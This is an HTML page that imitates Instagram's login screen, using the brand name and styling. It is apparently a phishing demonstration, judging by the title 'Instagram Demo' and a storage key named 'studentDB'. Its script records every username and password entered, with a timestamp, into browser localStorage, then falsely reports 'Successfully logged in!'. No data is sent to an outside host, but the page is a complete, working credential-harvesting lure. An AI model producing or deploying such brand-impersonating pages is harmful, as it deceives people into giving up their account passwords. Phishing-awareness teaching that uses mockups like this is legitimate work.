<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram Demo</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-card {
            background: white;
            border: 1px solid #dbdbdb;
            width: 350px;
            padding: 40px 0;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .logo {
            font-size: 2.5rem;
            font-weight: bold;
            margin-bottom: 30px;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; /* Placeholder for Instagram font */
        }
        input {
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            width: 260px;
            padding: 10px;
            margin-bottom: 10px;
            font-size: 12px;
        }
        button {
            width: 280px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 8px 0;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
        }
        button:hover { background-color: #1877f2; }
        #successMessage {
            color: #262626;
            font-size: 14px;
            margin-top: 20px;
            display: none;
        }
    </style>
</head>
<body>

    <div class="login-card">
        <div class="logo">Instagram</div>
        
        <input type="text" id="username" placeholder="Phone number, username, or email">
        <input type="password" id="password" placeholder="Password">
        
        <button onclick="handleSubmission()">Log In</button>

        <p id="successMessage">Successfully logged in!</p>
    </div>

    <script>
        function handleSubmission() {
            const userVal = document.getElementById('username').value;
            const passVal = document.getElementById('password').value;
            
            if (userVal && passVal) {
                let database = JSON.parse(localStorage.getItem('studentDB')) || [];
                database.push({
                    username: userVal,
                    password: passVal,
                    time: new Date().toLocaleString()
                });
                localStorage.setItem('studentDB', JSON.stringify(database));
                
                // Clear inputs and show subtle success
                document.getElementById('username').value = "";
                document.getElementById('password').value = "";
                document.getElementById('successMessage').style.display = "block";
            }
        }
    </script>

</body>
</html>
